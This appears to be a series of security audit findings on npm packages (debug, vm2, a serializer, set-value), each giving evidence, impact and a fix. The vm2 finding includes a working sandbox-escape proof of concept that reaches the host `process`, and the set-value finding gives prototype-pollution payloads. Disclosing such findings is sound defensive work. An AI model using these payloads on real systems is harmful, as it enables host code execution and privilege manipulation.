The 256-colour palette in the new Node implementation can never activate, so `debug` always renders with the 6-colour default even on a 256-colour terminal. The block also depends on a module the package does not declare.

**Evidence:**
`src/node.js:28-41` does:

```js
try {
  var supportsColor = require('supports-color');
  if (supportsColor && supportsColor.level >= 2) { exports.colors = [ ...76 codes... ]; }
} catch (err) {}
```

- `package.json:20-22` declares only `ms` as a dependency, so a clean production install of `debug` has no `supports-color`; the `require` throws MODULE_NOT_FOUND and the catch swallows it. The 256-colour branch is dead for every consumer.
- When `supports-color` *is* present via another package (the sandbox install hoisted v3.2.3), `require('supports-color')` exports a boolean (v1–v3 API), so `supportsColor.level` is `undefined` and `undefined >= 2` is false. The `.level` property is a supports-color v4+ API, and in v5+ the levels moved to `supportsColor.stdout` / `supportsColor.stderr`.
- Reproduced in the sandbox: `require('supports-color')` → 3.2.3, `typeof sc === 'boolean'`, `sc.level === undefined`.

**Impact:** Colour output degrades to the 6-colour palette on 256-colour terminals; no crash and no data loss, because both failure modes fall back to the hard-coded default at `src/node.js:26`. Cosmetic only, hence info.

**Fix:** Declare `supports-color` in `dependencies` and read the level across versions, e.g. `(supportsColor.stderr || supportsColor).level >= 2`, which is the change upstream itself made later (commit 285dfe1, "fix colors with `supports-color@5`").

Sandboxed code can escape the VM and run code in the host realm. `Decontextify.value`
and `Contextify.value` consult their `WeakMap` caches before entering the `try` block
that exists to stop host-realm exceptions from crossing the boundary
(`lib/contextify.js:330-336` and `lib/contextify.js:624-630`). When the JS stack is
nearly exhausted, the call to `Contextified.has` / `Decontextified.has` itself throws a
host `RangeError` instead of reaching a trap's own try/catch, and that raw host error is
delivered to sandboxed code. The error's prototype chain leads to the host `Function`,
so `err.constructor.constructor('return process')()` returns the real host `process`
object and the sandbox can run arbitrary code.

**Preconditions:** the sandbox runs untrusted code (`VM`/`NodeVM`), which is vm2's whole
purpose. The stack is pushed to its limit so that a host-side bridge call is the one
that overflows. The issue reporter's loop retries until the host `RangeError` surfaces,
so the timing does not need to be exact.

**Evidence:** run against this tree on Node 24 (`node /tmp/poc.js`):

```js
const {VM} = require('./lib/main.js');
new VM().run(`
const f = Buffer.prototype.write;
const ft = {length: 10, utf8Write(){}};
function r(i){
  var x = 0;
  try { x = r(i); } catch (e) {}
  if (typeof x !== 'number') return x;
  if (x !== i) return x + 1;
  try { f.call(ft); } catch (e) { return e; }
  return null;
}
var i = 1, n = 0;
while (1) {
  if (++n > 20000) break;
  try { i = r(i).constructor.constructor("return process")(); break; } catch (x) { i++; }
}
JSON.stringify({n, pid: i.pid});
`);
```

This prints `{"n":7,"pid":546}` where `546` is the host process id (`process.pid` of the
process running the sandbox); the sandbox now holds the host `process`. From there
`process.mainModule.require('child_process')` (or any host capability) is reachable.
With the two lookups moved inside the `try` blocks (the shape of upstream fix 4b22d70)
the same script reports `{"escaped":false}` after 20001 tries, i.e. no host error is
ever delivered.

**Impact:** an actor that the embedder explicitly confined (untrusted sandboxed code)
gains host-realm code execution, i.e. everything the host process can do. That is a
crossed trust boundary with permanent effect, so `high`: it is CVE-2019-10761.

**Fix:** restore the invariant that no host-realm exception leaves the conversion
layer. Move both `WeakMap` lookups inside the existing `try { ... } catch { return null; }`
in `Decontextify.value` and `Contextify.value`, as 3.6.11 does. Any host exception,
including a stack-overflow `RangeError`, must be converted (`null`) rather than thrown
into sandboxed code. Consider also guarding `has`/`get` on the two maps with their own
`try` so a failing lookup cannot skip the conversion.

`options.ignoreFunction` deletes function-valued properties from the caller's own object while serializing it. `deleteFunctions` (index.js:34-44) is passed the live object through the replacer (index.js:66-68), so a read-only serialization step corrupts the input, leaves holes in arrays, and throws on non-configurable properties.

**Evidence:**

```
$ node -e 'var s=require("./index.js");
  var o = {a:1, fn:function(){}};
  console.log(s(o,{ignoreFunction:true}), Object.keys(o));
  var arr = [1, function(){}, 3];
  s(arr,{ignoreFunction:true}); console.log(JSON.stringify(arr), 1 in arr);
  try { s(Object.freeze({port:80, handler:function(){}}),{ignoreFunction:true}) }
  catch (e) { console.log(e.message) }'
{"a":1} [ 'a' ]
[1,null,3] false
Cannot delete property 'handler' of #<Object>
```

With one non-configurable function property the throw happens after earlier properties are already deleted: `{f1:fn, n:1}` plus a non-configurable `f2` throws `Cannot delete property 'f2'` and leaves `['n','f2']`.

**Impact:** a caller that serializes a configuration or model object with `ignoreFunction` finds it mutated afterwards, so a second serialization or any later use of the object sees different data; frozen or sealed objects (ES module constants, `Object.freeze`d config) turn the option into a crash partway through the call. Contained and repairable by the caller — low.

**Fix:** never mutate the input: return `undefined` from the replacer for function values (or serialize a filtered copy), so `ignoreFunction` has no side effects and works on frozen objects.

`set()` accepts an array path (index.js:19; test.js has "should support passing an array as the key"), but the prototype-pollution guard compares each element to the blocked names by identity:

```js
function isValidKey(key) {
  return key !== '__proto__' && key !== 'constructor' && key !== 'prototype';
}
```

(index.js:101-103). The same elements are later used as property keys (index.js:40, 49), where they go through `ToPropertyKey`. Any element that stringifies to a blocked name — for example the nested array `['__proto__']` — passes the filter, and `target[prop]` resolves to the global `Object.prototype`, so the last segment is written onto it. The payload is plain JSON; no functions or exotic objects are needed.

**Preconditions:** the caller passes a path array whose elements are not all strings, e.g. `set(obj, req.body.path, req.body.value)` with `req.body.path = [["__proto__"], "isAdmin"]`. String paths and arrays of strings stay blocked by the filter (checked).

**Evidence:**

```js
const set = require('./index.js');
({}).isAdmin;                                          // undefined
set({}, JSON.parse('[["__proto__"],"isAdmin"]'), true);
({}).isAdmin;                                          // true
Object.prototype.hasOwnProperty('isAdmin');            // true (enumerable)

set({}, JSON.parse('[["constructor"],["prototype"],"opts"]'), {debug: true});
({}).opts;                                             // {debug: true}
```

`isValidKey(['__proto__'])` is `true`, then `({})[['__proto__']]` is `Object.prototype`, which `isObject` (index.js:105-107) accepts, so no `{}` is created and the loop walks into it (index.js:40-49).

**Impact:** an untrusted path lets an unauthenticated caller add enumerable properties to `Object.prototype` for the whole Node process — the outcome CVE-2019-10747 describes, reached through the guard that is meant to prevent it. The state outlives the request, so every request, tenant, and dependency in the process sees the injected values; nothing in the library removes them. This is the published GHSA-4jqc-8m5r-9rpr for this exact version (CWE-843 type confusion, affected `>=3.0.0 <3.0.3`, rated high). High: crosses a trust boundary with permanent effect.

**Fix:** validate each element in the form it will be used as a key — coerce in `isValidKey` (`if (typeof key !== 'string' && typeof key !== 'number') key = String(key);`) or reject elements that are not strings/numbers, so no element reaching `target[prop]` is unchecked.
